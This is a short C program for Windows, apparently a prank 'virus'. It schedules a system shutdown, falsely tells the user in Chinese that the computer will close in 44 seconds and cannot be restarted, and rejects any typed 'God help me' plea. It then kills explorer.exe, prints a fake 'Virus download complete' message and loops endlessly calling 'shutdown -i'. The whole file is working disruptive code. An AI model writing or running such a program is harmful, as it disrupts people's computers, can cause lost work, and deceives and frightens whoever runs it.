#include<stdio.h>
#include<stdlib.h>
#include<windows.h>

int main()
{
	char help_me[8];
	int ix=0;
   printf("			永远相信美好的事情即将发生！\n");
	Sleep(2000); 
	system("shutdown -s -t 2640");
   printf("\n\a电脑将在44秒内被关闭，且无法被重启！\n\n");
   printf("If you want to abolish the move,enter \"God help me\":");
   for(;ix<8;++ix)
   	scanf(" %c",&help_me[ix]);
   printf("Oops,you enter are error!!!\n\n");
   //system("start explorer.exe");
   system("taskkill /f /im explorer.exe");
   Sleep(5000);
	system("cls");
	ix=0;
	printf("\t");
	while(ix<30)
	{
		printf(">>");
		Sleep(100);
		ix++;
	} 
   printf("%c\n",2);
	Sleep(400);
	printf("\a");
	printf(" %c",1);
	printf(" Virus download complete");
	printf("%c",1);
	Sleep(500);
	while(1)
      system("shutdown -i");
   return 0;    
}

